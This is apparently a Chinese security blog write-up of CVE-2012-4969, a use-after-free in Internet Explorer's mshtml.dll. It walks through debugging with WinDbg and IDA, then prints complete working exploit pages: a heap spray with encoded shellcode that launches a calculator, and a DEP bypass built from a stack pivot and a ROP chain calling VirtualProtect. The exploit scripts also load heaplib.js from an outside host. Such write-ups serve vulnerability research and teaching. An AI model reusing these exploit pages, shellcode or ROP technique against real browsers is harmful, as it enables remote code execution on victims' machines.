# CVE-2012-4969 UAF漏洞分析与利用

## 前言

`CVE-2012-4969`是一个`IE`的`0day`漏洞，`Microsoft Internet Explorer 6`至9版本中的`mshtml.dll`中的`CMshtmlEd::Exec`函数中存在`UAF`漏洞，可以制造特定的网页，执行任意代码。

## 环境

这里的环境是`XP SP3`，安装了`IE8`和`IE Collection`，`windbg`，`IDA`等工具，`IE8`默认开启了`DEP`，当然换到`win7`下情况差不多。

## POC

首先用`poc`验证一下漏洞。

`trigger.htm`:

```
<html>
<body>
<script>
var arr = new Array();
arr[0] = window.document.createElement("img");
arr[0]["src"] = "1";
</script>
<iframe src="poc.htm"></iframe>
</body>
</html>
```

`poc.htm`:

```
<html>
<script>
function SelectAll() {
	document.execCommand("selectAll");
};

function Trigger() {
	document.write("1");
	parent.arr[0].src = "AAAA\u0c08\u0c0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}

</script>
<body onload="SelectAll();" onselect="Trigger();">
<div contenteditable="true">a</div>
</body>
</html>
```

把`trigger.htm`拖到IE8中浏览器崩溃，用`windbg`调试看到:

```
eax=00000000 ebx=0000001f ecx=0020e908 edx=0000000d esi=00000000 edi=0c0c0c08
eip=637d464e esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0x134:
637d464e 8b07            mov     eax,dword ptr [edi]  ds:0023:0c0c0c08=????????
```

看到`edi`的值可控，下面会详细分析，先做一些调试前的准备。

## 开启页堆和栈回溯

为了更好的追踪内存分配过程，需要打开IE的`full pageheap`，在`windbg`工具包里有个`gflag.exe`，被称为全局标志编辑器，是windows调试工具集的一部分，该程序是用于对各个全局标志选项的集中式配置工具，有图形化界面，里面有很多选项，也有命令行参数，开启IE页堆的命令:

```
C:\> gflags.exe /i iexplore.exe +hpa
Current Registry Settings for iexplore.exe executable are: 02000000
    hpa - Enable page heap
```

`iexplore.exe`是IE可执行文件的位置，根据具体情况确定，这样就为IE开启了页堆，同时也可以开启栈回溯:

```
C:\> gflags.exe /i iexplore.exe +ust
Current Registry Settings for iexplore.exe executable are: 02001000
    ust - Create user mode stack trace database
    hpa - Enable page heap
```

虽然开启页堆和栈回溯会便于调试，但开启后内存布局可能会发生变化，之前的poc可能会和之前得到不一样的结果，在调试后可以关闭这两个标志再进行exp的测试，关闭就是把加号换成减号。

## IDA配置符号表

为了在`IDA`里正确的查看dll的函数，需要正确的配置符号表。第一种方法是配置环境变量`_NT_SYMBOL_PATH`，配置为:

```
SRV*C:\Symbols*[http://msdl.microsoft.com/download/symbols](http://msdl.microsoft.com/download/symbols)
```

第二种方法，在`IDA`目录下有个`cfg`目录，里面有个文件是`pdb.cfg`，这是`IDA`符号表的配置文件，内容如下:

```
// PDB plugin
#ifdef __PC__                           // INTEL 80x86 PROCESSORS
//
// The downloaded symbols are stored in the specified directory.
// Microsoft's public symbol store is used for downloading the symbols.
//
// If this option is omitted or empty  - use _NT_SYMBOL_PATH if set, otherwise use %TEMP%\ida directory
// If the value is not empty           - use it
PDBSYM_DOWNLOAD_PATH    = "C:\\Symbols";
// Full symbol path (in _NT_SYMBOL_PATH format)
// If set, PDBSYM_DOWNLOAD_PATH and _NT_SYMBOL_PATH are ignored
PDBSYM_SYMPATH = "SRV*C:\\Symbols*[http://msdl.microsoft.com/download/symbols](http://msdl.microsoft.com/download/symbols)";
...
...
```

将如下两行取消注释:

```
PDBSYM_DOWNLOAD_PATH    = "C:\\Symbols";
PDBSYM_SYMPATH = "SRV*C:\\Symbols*[http://msdl.microsoft.com/download/symbols](http://msdl.microsoft.com/download/symbols)";
```

这样加载dll文件时，会有对话框询问是否要下载符号表，点击确定后`IDA`就会自动从微软的服务器上下载符号表了，这样所有函数都会有正确的名称，查找函数很方便。

## 静态分析

看一下`CMshtmlEd::Exec`的定义:

```
signed int __stdcall CMshtmlEd::Exec(CMshtmlEd *this, const struct _GUID *a2, unsigned __int32 a3, unsigned __int32 a4, struct tagVARIANT *a5, struct tagVARIANT *a6)
```

查看这个函数的汇编，崩溃点在`0x637d464e`，最开始传入`edi`的是`0x637d45c4`处的mov指令，传入的是函数第一个参数:

```
0:008> u mshtml!CMshtmlEd::Exec 637D4662
mshtml!CMshtmlEd::Exec:
637d45bc 8bff            mov     edi,edi
637d45be 55              push    ebp
637d45bf 8bec            mov     ebp,esp
637d45c1 53              push    ebx
637d45c2 56              push    esi
637d45c3 57              push    edi
637d45c4 8b7d08          mov     edi,dword ptr [ebp+8]
637d45c7 8b4708          mov     eax,dword ptr [edi+8]
637d45ca 8b08            mov     ecx,dword ptr [eax]
637d45cc 50              push    eax
637d45cd be00010480      mov     esi,80040100h
637d45d2 ff5104          call    dword ptr [ecx+4]
637d45d5 837d1403        cmp     dword ptr [ebp+14h],3
637d45d9 7470            je      mshtml!CMshtmlEd::Exec+0x131 (637d464b)
637d45db 8b5d10          mov     ebx,dword ptr [ebp+10h]
637d45de 81fb0e090000    cmp     ebx,90Eh
637d45e4 0f85a2800800    jne     mshtml!CMshtmlEd::Exec+0x2e (6385c68c)
637d45ea ff751c          push    dword ptr [ebp+1Ch]
637d45ed 8b4708          mov     eax,dword ptr [edi+8]
637d45f0 ff7518          push    dword ptr [ebp+18h]
637d45f3 ff7514          push    dword ptr [ebp+14h]
637d45f6 53              push    ebx
637d45f7 ff750c          push    dword ptr [ebp+0Ch]
637d45fa e8b8feffff      call    mshtml!CHTMLEditor::InternalExec (637d44b7)
637d45ff 8bf0            mov     esi,eax
637d4601 85f6            test    esi,esi
637d4603 7c46            jl      mshtml!CMshtmlEd::Exec+0x131 (637d464b)
637d4605 7444            je      mshtml!CMshtmlEd::Exec+0x131 (637d464b)
637d4607 b81c090000      mov     eax,91Ch
637d460c 3bd8            cmp     ebx,eax
637d460e 0f838f800800    jae     mshtml!CMshtmlEd::Exec+0x72 (6385c6a3)
637d4614 ff7518          push    dword ptr [ebp+18h]
637d4617 53              push    ebx
637d4618 ff7514          push    dword ptr [ebp+14h]
637d461b e8d3feffff      call    mshtml!CMshtmlEd::IsDialogCommand (637d44f3)
637d4620 85c0            test    eax,eax
637d4622 8b4708          mov     eax,dword ptr [edi+8]
637d4625 8b4050          mov     eax,dword ptr [eax+50h]
637d4628 0f8502810800    jne     mshtml!CMshtmlEd::Exec+0x10b (6385c730)
637d462e 53              push    ebx
637d462f e8f1faffff      call    mshtml!CCommandTable::Get (637d4125)
637d4634 85c0            test    eax,eax
637d4636 7425            je      mshtml!CMshtmlEd::Exec+0x12c (637d465d)
637d4638 57              push    edi
637d4639 ff751c          push    dword ptr [ebp+1Ch]
637d463c 8bf0            mov     esi,eax
637d463e ff7518          push    dword ptr [ebp+18h]
637d4641 ff7514          push    dword ptr [ebp+14h]
637d4644 e820000000      call    mshtml!CCommand::Exec (637d4669)
637d4649 8bf0            mov     esi,eax
637d464b 8b7f08          mov     edi,dword ptr [edi+8]
637d464e 8b07            mov     eax,dword ptr [edi]
637d4650 57              push    edi
637d4651 ff5008          call    dword ptr [eax+8]
637d4654 8bc6            mov     eax,esi
637d4656 5f              pop     edi
637d4657 5e              pop     esi
637d4658 5b              pop     ebx
637d4659 5d              pop     ebp
637d465a c21800          ret     18h
637d465d be00010480      mov     esi,80040100h
637d4662 ebe7            jmp     mshtml!CMshtmlEd::Exec+0x131 (637d464b)
```

`IDA`里可以看到传给`edi`的是`this`，也就是`CMshtmlEd`类的一个实例:

```
.text:637D45BC this            = dword ptr  8
.text:637D45BC arg_4           = dword ptr  0Ch
.text:637D45BC arg_8           = dword ptr  10h
.text:637D45BC arg_C           = dword ptr  14h
.text:637D45BC arg_10          = dword ptr  18h
.text:637D45BC arg_14          = dword ptr  1Ch
.text:637D45BC
.text:637D45BC ; FUNCTION CHUNK AT .text:6385C68C SIZE 000000AB BYTES
.text:637D45BC
.text:637D45BC                 mov     edi, edi
.text:637D45BE                 push    ebp
.text:637D45BF                 mov     ebp, esp
.text:637D45C1                 push    ebx
.text:637D45C2                 push    esi
.text:637D45C3                 push    edi
.text:637D45C4                 mov     edi, [ebp+this]
```

根据函数流程大致推测这个函数先从`CMshtmlEd`类中取得一个成员类，然后调用类中的某个虚函数，之后从`CCommandTable`中取得对象实例，然后调用`CCommand::Exec`函数。

看一下这个关于这个类的函数:

```
Function name                                                                           
-------------                                                                           
CHTMLEditor::AddCommandTarget(IMarkupContainer *,CMshtmlEd * *)                         
CMshtmlEd::Initialize(IUnknown *)                                                       
CMshtmlEd::CMshtmlEd(CHTMLEditor *,int)                                                 
CSpringLoader::CSpringLoader(CMshtmlEd *)                                               
CHTMLEditor::FindCommandTarget(IMarkupContainer *,CMshtmlEd * *)                        
CCommand::QueryStatus(_tagOLECMD *,_tagOLECMDTEXT *,CMshtmlEd *)                        
CMshtmlEd::GetSegmentList(ISegmentList * *)                                             
CMshtmlEd::~CMshtmlEd(void)                                                             
CMshtmlEd::QueryStatus(_GUID const *,ulong,_tagOLECMD * const,_tagOLECMDTEXT *)         
CMshtmlEd::Release(void)                                                                
CMshtmlEd::QueryInterface(_GUID const &,void * *)                                       
CHTMLEditor::PushCommandTarget(CMshtmlEd *)                                             
CMshtmlEd::IsDialogCommand(ulong,ulong,tagVARIANT *)                                    
CMshtmlEd::Exec(_GUID const *,ulong,ulong,tagVARIANT *,tagVARIANT *)                    
CCommand::Exec(ulong,tagVARIANT *,tagVARIANT *,CMshtmlEd *)                             
CBaseCharCommand::Apply(CMshtmlEd *,IMarkupPointer *,IMarkupPointer *,tagVARIANT *,int) 
CCharCommand::Remove(CMshtmlEd *,IMarkupPointer *,IMarkupPointer *)
```

大致看一下，下面分析时可能会看到这些函数。

## 调试分析

先不打开页堆和栈回溯，在崩溃点前设断点，然后单步看看:

```
0:008> t
eax=00000000 ebx=0000001f ecx=001f6b50 edx=0000000d esi=00000000 edi=0022bc78
eip=637d464b esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0x131:
637d464b 8b7f08          mov     edi,dword ptr [edi+8] ds:0023:0022bc80=080c0c0c
0:008> dd 0022bc78
0022bc78  00410041 00410041 0c0c0c08 00410041
0022bc88  00410041 00410041 00410041 00410041
0022bc98  00410041 00410041 00410041 00410041
0022bca8  00410041 00410041 00410041 00410041
0022bcb8  00410041 00410041 00410041 00410041
0022bcc8  00410041 00410041 00410041 00410041
```

看到了我们的`payload`，这样看不出什么。

附加上IE，在`CMshtmlEd::Exec`函数开头下断点单步调试，重点关注这三条指令:

```
0:008> 
eax=038e7aa0 ebx=6361bad0 ecx=63639ea4 edx=00000000 esi=038ea0d8 edi=00000000
eip=637d45c4 esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0x8:
637d45c4 8b7d08          mov     edi,dword ptr [ebp+8] ss:0023:0208be94=a07a8e03
0:008> 
eax=038e7aa0 ebx=6361bad0 ecx=63639ea4 edx=00000000 esi=038ea0d8 edi=038e7aa0
eip=637d45c7 esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0xb:
637d45c7 8b4708          mov     eax,dword ptr [edi+8] ds:0023:038e7aa8=f0182100
0:008> 
eax=002118f0 ebx=6361bad0 ecx=63639ea4 edx=00000000 esi=038ea0d8 edi=038e7aa0
eip=637d45ca esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0xe:
637d45ca 8b08            mov     ecx,dword ptr [eax]  ds:0023:002118f0={mshtml!ATL::CComObject<CHTMLEditorProxy>::`vftable' (6361c190)}
```

通过这段信息我们知道`[edi+8]`处是`CMshtmlEd`的一个成员变量`CComObject<CHTMLEditorProxy>`，`0x637d45ca`处的指令取得这个类的虚函数表，并执行其中一个函数，对应:

```
637d45c4 8b7d08          mov     edi,dword ptr [ebp+8]
637d45c7 8b4708          mov     eax,dword ptr [edi+8]
637d45ca 8b08            mov     ecx,dword ptr [eax]
637d45cc 50              push    eax
637d45cd be00010480      mov     esi,80040100h
637d45d2 ff5104          call    dword ptr [ecx+4]
```

后面可以一直单步到`0x637d4644`处的`CCommand::Exec`函数调用:

```
0:008> p
eax=038302e0 ebx=0000001f ecx=038302e0 edx=0000001f esi=038302e0 edi=038e7aa0
eip=637d4644 esp=0208be70 ebp=0208be8c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CMshtmlEd::Exec+0x123:
637d4644 e820000000      call    mshtml!CCommand::Exec (637d4669)
```

此时`esi=038302e0 edi=038e7aa0`，分别是`CCommandTable`中的对象实例和`CMshtmlEd`对象实例，这时`0x038e7aa0`内存中内容为:

```
0:008> dd 038e7aa0
038e7aa0  63639ea4 00000002 002118f0 038c3710
038e7ab0  03486290 00000000 00000000 00000000
038e7ac0  00000000 00000000 00000000 00000000
```

执行完`CCommand::Exec`后这段内存变为:

```
0:008> dd 038e7aa0
038e7aa0  00410041 00410041 0c0c0c08 00410041
038e7ab0  00410041 00410041 00410041 00410041
038e7ac0  00410041 00410041 00410041 00410041
038e7ad0  00410041 00410041 00410041 00410041
```

变成了我们的`payload`，那么应该是在`CCommand::Exec`函数中发生了`UAF`，回头看`poc.htm`:

```
<html>
<script>
function SelectAll() {

	document.execCommand("selectAll");

};

function Trigger() {
	document.write("1");
	parent.arr[0].src = "AAAA\u0c08\u0c0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}

</script>
<body onload="SelectAll();" onselect="Trigger();">
<div contenteditable="true">a</div>
</body>
</html>
```

我猜测在`document.execCommand("selectAll");`这句话执行后会触发`onselect`事件，调用了`Trigger`函数，而`document.write("1");`这行会释放页面对象，刷新页面，写入`1`，然后对`parent.arr[0].src`的赋值覆盖了已经被释放的内存，然后导致了`CCommand::Exec`执行完后的`UAF`。

根据静态分析，对象的释放函数很可能是`CMshtmlEd::Release`，我们在这个函数上下断点重新调试。

在`0x637d45c7`处下断点可知这次对象的地址为`0x0022b530`，在`CCommand::Exec`中的这句话时触发了`CMshtmlEd::Release`，现在断在了`CMshtmlEd::Release`:

```
0:008> p
eax=6363b7a8 ebx=0000001f ecx=02eeeb50 edx=00000004 esi=02eeeb50 edi=00000000
eip=637d46ae esp=0208be50 ebp=0208be68 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CCommand::Exec+0x45:
637d46ae ff5008          call    dword ptr [eax+8]    ds:0023:6363b7b0={mshtml!CSelectAllCommand::PrivateExec (63a0422e)}
0:008> p
Breakpoint 1 hit
eax=0022ae30 ebx=00202a40 ecx=63639ea4 edx=00000008 esi=0023fd58 edi=00000000
eip=637d3a90 esp=02088308 ebp=02088370 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Release:
637d3a90 8bff            mov     edi,edi
```

可以一直跟到调用`HeapFree`的地方，`HeapFree`的定义为:

```
BOOL HeapFree(
	HANDLE hHeap,
	DWORD dwFlags,
	LPVOID lpMem
);[1]
```

看看此时的栈情况

```
0:008> p
eax=00000000 ebx=001f6c8c ecx=00000000 edx=001f6c8c esi=0022b530 edi=00000001
eip=6375bf20 esp=02088274 ebp=02088284 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CMshtmlEd::Release+0x1f:
6375bf20 ff1568135863    call    dword ptr [mshtml!_imp__HeapFree (63581368)] ds:0023:63581368={ntdll!RtlFreeHeap (7c92ff0d)}
0:008> dd esp
02088274  00140000 00000000 0022b530 0022b530
```

第三个参数就是`CMshtmlEd`结构体的地址，然后的再次对`CMshtmlEd`对象中的赋值就能够触发漏洞，当`CCommand::Exec`执行完后就会进入下面的流程:

```
637d4649 8bf0            mov     esi,eax
637d464b 8b7f08          mov     edi,dword ptr [edi+8]
637d464e 8b07            mov     eax,dword ptr [edi]
637d4650 57              push    edi
637d4651 ff5008          call    dword ptr [eax+8]
```

此时`edi`指向的就是已经释放的内存，通过占位我们首先控制了`edi+8`，然后控制`[edi+8]`处的内容，最终只要`[eax+8]`处指向shellcode地址就可以成功执行代码。

## exp

这里涉及到了虚表，十分适合使用堆喷射技术，可以把`edi+8`处覆盖为`0x0c0c0c0c`，然后用`%u\0c0c%u\0c0c`填满堆内存，这样经过两次跳转，`eip`最终能够指向`0x0c0c0c0c`，在`trigger.htm`加入堆喷射的脚本然后再次调试:

```
0:008> t
eax=00000000 ebx=0000001f ecx=001f7538 edx=0000000d esi=00000000 edi=0c0c0c0c
eip=637d464e esp=0208be80 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0x134:
637d464e 8b07            mov     eax,dword ptr [edi]  ds:0023:0c0c0c0c=0c0c0c0c
0:008> dd 0c0c0c0c
0c0c0c0c  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
0c0c0c1c  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
0c0c0c2c  0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c
```

成功把`0x0c0c0c0c`填入了`eax`，然后成功控制了`eip`:

```
0:008> 
eax=0c0c0c0c ebx=0000001f ecx=001f7538 edx=0000000d esi=00000000 edi=0c0c0c0c
eip=637d4651 esp=0208be7c ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!CMshtmlEd::Exec+0x137:
637d4651 ff5008          call    dword ptr [eax+8]    ds:0023:0c0c0c14=0c0c0c0c
0:008> t
eax=0c0c0c0c ebx=0000001f ecx=001f7538 edx=0000000d esi=00000000 edi=0c0c0c0c
eip=0c0c0c0c esp=0208be78 ebp=0208be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0c0c0c0c 0c0c            or      al,0Ch
```

`trigger.htm`，使用了`heaplib.js`:

```
<html>
<body>
<script>
var arr = new Array();
arr[0] = window.document.createElement("img");
arr[0]["src"] = "1";
</script>

<script type="text/javascript" src="[http://pwdme.cc/heaplib.js](http://pwdme.cc/heaplib.js)"></script>

<script>

var heap_obj = new heapLib.ie(0x10000);

var code = unescape("%u\e8fc%u\0082%u\0000%u\8960%u\31e5%u\64c0%u\508b%u\8b30%u\0c52%u\528b%u\8b14%u\2872%u\b70f%u\264a%u\ff31%u\3cac%u\7c61%u\2c02%u\c120%u\0dcf%u\c701%u\f2e2%u\5752%u\528b%u\8b10%u\3c4a%u\4c8b%u\7811%u\48e3%u\d101%u\8b51%u\2059%u\d301%u\498b%u\e318%u\493a%u\348b%u\018b%u\31d6%u\acff%u\cfc1%u\010d%u\38c7%u\75e0%u\03f6%u\f87d%u\7d3b%u\7524%u\58e4%u\588b%u\0124%u\66d3%u\0c8b%u\8b4b%u\1c58%u\d301%u\048b%u\018b%u\89d0%u\2444%u\5b24%u\615b%u\5a59%u\ff51%u\5fe0%u\5a5f%u\128b%u\8deb%u\6a5d%u\8d01%u\b285%u\0000%u\5000%u\3168%u\6f8b%u\ff87%u\bbd5%u\b5f0%u\56a2%u\a668%u\bd95%u\ff9d%u\3cd5%u\7c06%u\800a%u\e0fb%u\0575%u\47bb%u\7213%u\6a6f%u\5300%u\d5ff%u\6163%u\636c%u\4100"); //Code to execute

var nops = unescape("%u\0c0c%u\0c0c"); //NOPs

while (nops.length < 0x1000) nops+= nops; // create big block of nops
// compose one block, which is nops + shellcode, size 0x800 (2048) bytes
var shellcode =  nops.substring(0,0x800 - code.length) + code;
// repeat the block
while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(2, 0x40000 - 0x21);
//spray
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);
}
</script>
<iframe src="poc.htm"></iframe>
</body>
</html>
```

`poc.htm`:

```
<html>
<script>
function SelectAll() {

	document.execCommand("selectAll");

};
function Trigger() {
	document.write("1");

	parent.arr[0].src = "AAAA\u0c0c\u0c0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}
</script>
<body onload="SelectAll();" onselect="Trigger();">
<div contenteditable="true">a</div>
</body>
</html>
```

在关闭了`DEP`的IE7上能够成功弹出计算器。

![未命名.png](http://image.3001.net/images/20171017/1508203097217.png!small)

## 绕过DEP

对于开启了`DEP`的IE需要实现精准堆喷射和`ROP`链的构造，根据这里的汇编:

```
637d464b 8b7f08          mov     edi,dword ptr [edi+8]
637d464e 8b07            mov     eax,dword ptr [edi]
637d4650 57              push    edi
637d4651 ff5008          call    dword ptr [eax+8]
```

首先用下面的脚本可以精确控制`0x0c0c0c0c`的内容。

`trigger.htm`，偏移根据系统不同需要更改:

```
<html>
<body>
<script>
var arr = new Array();
arr[0] = window.document.createElement("img");
arr[0]["src"] = "1";
</script>
<script type="text/javascript" src="[http://pwdme.cc/heaplib.js](http://pwdme.cc/heaplib.js)"></script>
<script>
var heap_obj = new heapLib.ie(0x10000);
var code = unescape("%u\cccc%u\cccc");

var rop = unescape("%u\4141%u\4141%u\4242%u\4242%u\4343%u\4343%u\4444%u\4444%u\4545%u\4545%u\4646%u\4646%u\4747%u\4747%u\4848%u\4848");

var padding = unescape("%u\0c0c%u\0c0c");

while (padding.length < 0x1000) padding += padding; // create big block of nops
offset_length = 0x5F6;
junk_offset = padding.substring(0, offset_length);

var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(2, 0x40000 - 0x21);
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);

}
</script>
<iframe src="poc.htm"></iframe>
</body>
</html>
```

`poc.htm`:

```
<html>
<script>
function SelectAll() {
	document.execCommand("selectAll");
};

function Trigger() {
	document.write("1");

	parent.arr[0].src = "AAAA\u0c0c\u0c0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}

</script>
<body onload="SelectAll();" onselect="Trigger();">
<div contenteditable="true">a</div>
</body>
</html>
```

最后效果:

```
0:008> dd 0c0c0c0c
0c0c0c0c  41414141 42424242 43434343 44444444
0c0c0c1c  45454545 46464646 47474747 48484848
0c0c0c2c  cccccccc cccccccc cccccccc cccccccc
```

我的做法是，内存还是用`0c0c0c0c`填充，但将`edi`的数值改为`0x0c0c0c00`，在`ROP`链之前加入，这段现在是`0c0c0c0c`的内容:

```
unescape("%u\0c10%u\0c0c%u\404b%u\7d5d%u\4343%u\4343%u\1b14%u\5d1b");
```

这样:

```
mov     edi,[edi+8] // edi = [0c0c0c08] = 0c0c0c0c
mov     eax,[edi] // eax = [0c0c0c0c] = 0c0c0c10
push    edi 
call    [eax+8] // call [0c0c0c18] = call 5d1b1b14
```

由于我们的`ROP`在堆中，所以需要把栈转移到堆中，这里就用到下面的指令:

```
0:012> u 5d1b1b14
comctl32_5d170000!CImageList::_IsSameObject+0x40:
5d1b1b14 94              xchg    eax,esp
5d1b1b15 c3              ret
```

这时`eax=0x0c0c0c10`，执行完后栈顶变为`eax`，所以`ret`到的地址是`0x7d5d404b`:

```
0:012> u 0x7d5d404b
SHELL32!CShellExecute::_ExecMayCreateProcess+0x36:
7d5d404b 5f              pop     edi
7d5d404c 5e              pop     esi
7d5d404d c20400          ret     4
```

把中间的junk跳过后`ret`到`ROP`内，直接在后面接上`ROP`链即可，改变的行只有:

```
var padrop = unescape("%u\0c10%u\0c0c%u\404b%u\7d5d%u\4343%u\4343%u\1b14%u\5d1b");
rop = padrop + rop;
```

还有把`poc.htm`中改成`\u0c0c\u0c00`，效果如下:

```
0:006> t
eax=0224be78 ebx=0000001f ecx=00205700 edx=0000000d esi=5d1b1b14 edi=43434343
eip=7d5d404d esp=0c0c0c1c ebp=0224be8c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
SHELL32!CShellExecute::_ExecMayCreateProcess+0x38:
7d5d404d c20400          ret     4
0:006> dd esp
0c0c0c1c  41414141 42424242 43434343 44444444
```

我使用`mona`这个`immunity debugger`的插件生成了可能的`ROP`链，经过修改和补全，最终的`exp`如下，生成的会缺少一些部分，需要自己去寻找地址，还要经过调试使得适合之前的代码。

`trigger.htm`:

```
<html>
<body>
<script>
var arr = new Array();
arr[0] = window.document.createElement("img");
arr[0]["src"] = "1";
</script>
<script type="text/javascript" src="[http://pwdme.cc/heaplib.js](http://pwdme.cc/heaplib.js)"></script>
<script>
var heap_obj = new heapLib.ie(0x10000);
// var code_addr = unescape("%u\cccc%u\cccc");

var code = unescape("%u\e8fc%u\0082%u\0000%u\8960%u\31e5%u\64c0%u\508b%u\8b30%u\0c52%u\528b%u\8b14%u\2872%u\b70f%u\264a%u\ff31%u\3cac%u\7c61%u\2c02%u\c120%u\0dcf%u\c701%u\f2e2%u\5752%u\528b%u\8b10%u\3c4a%u\4c8b%u\7811%u\48e3%u\d101%u\8b51%u\2059%u\d301%u\498b%u\e318%u\493a%u\348b%u\018b%u\31d6%u\acff%u\cfc1%u\010d%u\38c7%u\75e0%u\03f6%u\f87d%u\7d3b%u\7524%u\58e4%u\588b%u\0124%u\66d3%u\0c8b%u\8b4b%u\1c58%u\d301%u\048b%u\018b%u\89d0%u\2444%u\5b24%u\615b%u\5a59%u\ff51%u\5fe0%u\5a5f%u\128b%u\8deb%u\6a5d%u\8d01%u\b285%u\0000%u\5000%u\3168%u\6f8b%u\ff87%u\bbd5%u\b5f0%u\56a2%u\a668%u\bd95%u\ff9d%u\3cd5%u\7c06%u\800a%u\e0fb%u\0575%u\47bb%u\7213%u\6a6f%u\5300%u\d5ff%u\6163%u\636c%u\4100"); //Code to execute

var rop = unescape(
"%u\208c%u\0040" + // 0x0040208c : ,# POP EBP # RETN [iexplore.exe] 
"%u\4141%u\4141" +
"%u\208c%u\0040" + // 0x0040208c : ,# skip 4 bytes [iexplore.exe]
"%u\2b2b%u\0040" + // 0x00402b2b : ,# POP EBX # RETN [iexplore.exe] 
"%u\0201%u\0000" + // 0x00000201 : ,# 0x00000201-> ebx
"%u\cb29%u\77c1" + // 0x00000000 : ,# 0x77c1cb29
"%u\0040%u\0000" + 
"%u\2070%u\0040" + // 0x00402070 : ,# POP ECX # RETN [iexplore.exe] 
"%u\bfe2%u\0040" + // 0x0040bfe2 : ,# &Writable location [iexplore.exe]
"%u\19ec%u\0040" + // 0x004019ec : ,# POP EDI # POP ESI # RETN [iexplore.exe] 
"%u\1921%u\0040" + // 0x00401921 : ,# RETN (ROP NOP) [iexplore.exe]
"%u\4141%u\4141" + // 0x41414141 : ,# Filler (compensate)
"%u\187a%u\0040" + // 0x0040187a : ,# POP ESI # RETN [iexplore.exe] 
"%u\9336%u\0040" + // 0x00409336 : ,# JMP [EAX] [iexplore.exe]
"%u\2120%u\0040" + // 0x00402120 : ,# POP EAX # POP EBP # RETN [iexplore.exe] 
"%u\121c%u\75e0" + // 0x75e0121c : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT SXS.DLL]
"%u\0c68%u\0c0c" + // 0x41414141 : ,# Filler (compensate)
"%u\2cec%u\75e5" + // 0x75e52cec : ,# PUSHAD # RETN [SXS.DLL] 
"%u\318b%u\7d5a" + // 0x7d5a318b : ,# jmp esp [shell32.dll]
"");

var padding = unescape("%u\0c0c%u\0c0c");
var padrop = unescape("%u\0c10%u\0c0c%u\404b%u\7d5d%u\4343%u\4343%u\1b14%u\5d1b");
//var stack_over = unescape();  // xchg eax,esp; ret
rop = padrop + rop;

while (padding.length < 0x1000) padding += padding; // create big block of nops
offset_length = 0x5F6;
junk_offset = padding.substring(0, offset_length);
var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(2, 0x40000 - 0x21);
for (var i=0; i < 500; i++) {
    heap_obj.alloc(block);
}
</script>
<iframe src="poc.htm"></iframe>
</body>
</html>
```

`poc.htm`:

```
<html>
<script>
function SelectAll() {
	document.execCommand("selectAll");
};

function Trigger() {
	document.write("1");
	parent.arr[0].src = "AAAA\u0c0c\u0c00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}

</script>
<body onload="SelectAll();" onselect="Trigger();">
<div contenteditable="true">a</div>
</body>
</html>
```

能够成功弹出计算器。

![未命名1.png](http://image.3001.net/images/20171017/15082030525698.png!small)

## 总结

这个漏洞利用起来还是较为容易的，通过构造的网页可能会造成大面积攻击，可能针对win7攻击时需要寻找关闭了ASLR的模块写rop链，对于这个漏洞msf里有现成的模块，但经过试验攻击并不成功，可能系统的某些地址发生了变化，微软在2012年9月17日发布了安全更新修复了这个漏洞。